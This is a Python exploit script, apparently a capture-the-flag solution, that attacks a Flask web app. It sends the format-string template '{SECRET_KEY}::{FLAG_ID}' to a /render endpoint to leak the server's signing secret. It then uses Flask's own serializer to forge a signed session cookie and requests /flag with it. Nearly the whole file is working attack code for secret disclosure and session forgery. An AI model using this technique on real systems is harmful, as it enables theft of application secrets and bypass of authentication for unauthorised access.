#!/usr/bin/env python3
"""
exploit_fixed_flask.py

1) Leak SECRET_KEY and FLAG_ID via /render
2) Create a minimal Flask app locally with leaked SECRET_KEY
3) Use Flask's SecureCookieSessionInterface to create a proper session cookie
4) Request /flag with the forged cookie
"""

import requests
import argparse
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

DEFAULT_URL = "http://localhost:8763"

def leak_secret_and_flagid(base):
    url = base.rstrip('/') + '/render'
    payload = {"template": "{SECRET_KEY}::{FLAG_ID}"}
    r = requests.post(url, json=payload, timeout=6)
    r.raise_for_status()
    j = r.json()
    res = j.get('result') or ''
    if '::' in res:
        sk, fid = res.split('::', 1)
        return sk.strip(), fid.strip()
    return None, None

def make_flask_session_cookie(secret_key, session_dict):
    """
    Build a proper Flask session cookie using Flask's SecureCookieSessionInterface
    so the cookie is serialized/signed exactly the same way the server does.
    """
    # create ephemeral Flask app with the leaked secret
    app = Flask(__name__)
    app.config['SECRET_KEY'] = secret_key

    # get the signing serializer used for the session cookie
    signer = SecureCookieSessionInterface().get_signing_serializer(app)
    if signer is None:
        raise RuntimeError("Could not get signing serializer from Flask interface")
    # dumps -> session cookie string
    cookie_val = signer.dumps(session_dict)
    return cookie_val

def try_with_cookie_header(base, cookie_val):
    headers = {'Cookie': f'session={cookie_val}'}
    r = requests.get(base.rstrip('/') + '/flag', headers=headers, timeout=6)
    return r.status_code, r.text

def try_with_session_jar(base, cookie_val):
    s = requests.Session()
    from requests.cookies import create_cookie
    c = create_cookie(name='session', value=cookie_val, path='/')
    s.cookies.set_cookie(c)
    r = s.get(base.rstrip('/') + '/flag', timeout=6)
    return r.status_code, r.text

def main(base):
    print("[*] leaking secret + flag id via /render ...")
    sk, fid = leak_secret_and_flagid(base)
    if not sk:
        print("[-] Leak failed")
        return 1
    print("[+] leaked SECRET_KEY:", sk)
    print("[+] leaked FLAG_ID   :", fid)

    print("[*] forging a proper Flask session cookie (using Flask internals)...")
    cookie_val = make_flask_session_cookie(sk, {"flag_id": fid})
    print("[+] forged cookie preview:", cookie_val[:120] + ("..." if len(cookie_val)>120 else ""))

    print("[*] trying Cookie header method ...")
    st, body = try_with_cookie_header(base, cookie_val)
    print("[*] status:", st)
    if st == 200:
        print("[+] Success! Flag:\n", body)
        return 0
    print("[!] Cookie header method failed, trying session jar...")

    st2, body2 = try_with_session_jar(base, cookie_val)
    print("[*] status:", st2)
    if st2 == 200:
        print("[+] Success! Flag:\n", body2)
        return 0

    print("[-] Both methods failed.")
    print("Header method:", st, body[:300])
    print("Jar method   :", st2, body2[:300])
    return 2

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument('--url', default=DEFAULT_URL)
    args = p.parse_args()
    raise SystemExit(main(args.url))
